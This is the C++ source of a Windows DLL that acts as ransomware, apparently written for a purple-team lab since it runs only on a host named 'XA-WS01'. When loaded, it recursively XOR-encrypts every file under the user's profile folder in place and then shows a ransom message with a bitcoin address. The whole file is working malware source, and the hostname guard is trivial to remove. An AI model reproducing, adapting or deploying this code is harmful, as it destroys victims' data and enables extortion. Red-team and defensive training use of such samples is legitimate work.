// dllmain.cpp : Defines the entry point for the DLL application
#include "pch.h"
#include <windows.h>
#include <winerror.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <knownfolders.h>

#define KEY "lcpurpleteaming"
#define ALLOWED_HOSTNAME "XA-WS01"

// XOR each byte with key
void superrichikommtzudirgefliegt(unsigned char* data, size_t len, const char* key) {
    size_t klen = strlen(key);
    for (size_t i = 0; i < len; i++)
        data[i] ^= key[i % klen];
}

void process_file(const char* filepath) {
    FILE* f = fopen(filepath, "rb+");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char* buf = (unsigned char*)malloc(size);
    if (!buf) { fclose(f); return; }

    fread(buf, 1, size, f);
    superrichikommtzudirgefliegt(buf, size, KEY);

    rewind(f);
    fwrite(buf, 1, size, f);

    fclose(f);
    free(buf);
    printf("Done!\n");
}

void process_folder(const char* path) {
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", path);  // <- Add this line

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        // Skip AppData folder
        if (strcmp(fd.cFileName, "AppData") == 0)
            continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            process_folder(fullpath);  // recurse
        }
        else {
            process_file(fullpath);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

void MainRoutine() {
    // Safety check: hostname
    char host[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(host);

    if (!GetComputerNameA(host, &size) || strcmp(host, ALLOWED_HOSTNAME) != 0) {
        fprintf(stderr, "Again, be careful not to encrypt your VM!\n");
        return;
    }

    char folder[MAX_PATH];


    PWSTR profile = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &profile))) {
        wcstombs(folder, profile, sizeof(folder));
        CoTaskMemFree(profile);
    }
    else {
        return;
    }

    process_folder(folder);

    return;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MainRoutine();
        MessageBoxA(NULL, "You have been hacked! Donate to the following bitcoin address to save your files!\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "Ransomware Attack", MB_OK | MB_ICONINFORMATION);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

